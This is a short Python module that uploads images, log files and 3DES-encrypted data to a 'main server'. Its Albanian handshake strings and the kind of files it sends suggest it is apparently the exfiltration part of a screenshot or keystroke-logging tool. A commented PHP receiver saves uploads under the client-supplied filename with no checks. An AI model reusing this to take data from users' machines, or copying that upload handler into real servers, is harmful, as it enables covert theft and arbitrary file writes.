import requests
import message_encrypter as CP
from bootstrap import *



def send_image_to_main_server(image_path_name):
    # print('Sending image to server')
    data = {'enc': CP.hand_shake_endcrypt_md5("Te kam sjelle nje foto!!")}
    files = {'file': open(image_path_name, 'rb')}
    r = requests.post(url, files=files, data=data)


    return r.text



def send_files_to_main_server(file_path_name):
    # print('Sending image to server')
    data = {'enc': CP.hand_shake_endcrypt_md5("Te kam sjelle nje log!!"),'filename':file_path_name.split('/')[-1]}
    files = {'file': open(file_path_name, 'rb')}
    r = requests.post(url, files=files, data=data)

    return r.text



def send_data_to_main_server(data):

    for k,v in data.items():
        if k == 'enc':
            data[k] = CP.hand_shake_endcrypt_md5(v)
        else:
            data[k] = CP.encrypt_3des(v)

    r = requests.post(url,data=data)

    return r.text



'''
in php 

<?php

$_POST['asdfasd']

print_r($_FILES);
move_uploaded_file($_FILES["file"]["tmp_name"],$_FILES["file"]["name"]);


'''














